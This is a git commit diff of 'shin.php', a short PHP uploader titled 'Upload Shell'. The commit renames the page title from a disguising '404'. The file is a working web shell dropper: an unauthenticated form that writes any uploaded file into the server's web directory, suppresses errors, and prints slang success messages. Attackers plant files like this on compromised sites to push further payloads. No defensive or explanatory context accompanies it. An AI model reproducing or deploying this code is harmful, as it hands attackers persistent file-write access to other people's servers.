335d5aead67b3212061b5d3d9a9dd259158f160a
WalidMahmoud101 <53156881+WalidMahmoud101@users.noreply.github.com>
2020-12-28 02:11:19 +0200

    Update shin.php

--- shin.php
+++ shin.php
@@ -1,4 +1,4 @@
-<img class=" height="200" src="https://i.ibb.co/DgFDH1p/photo-2.jpg"/><title>404</title>
+<img class=" height="200" src="https://i.ibb.co/DgFDH1p/photo-2.jpg"/><title>Upload Shell</title>
 <font face="Courier new" color="black" size="6">| _ByME - Mohamed Arafa- WalidMahmoud |</font>
 <style>body{font-size: 0;}h1{font-size: 12px}</style>
 <h1><?php if($_POST){ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>BERHASIL NGNTD:V</b>-->".$_FILES["f"]["name"]; }else{ echo"<b>GAGAL BNGSD"; } }else{ echo "<form method=post enctype=multipart/form-data><input type=file name=f><input name=v type=submit id=v value=Upload File> <br>"; }__halt_compiler();?></h1>
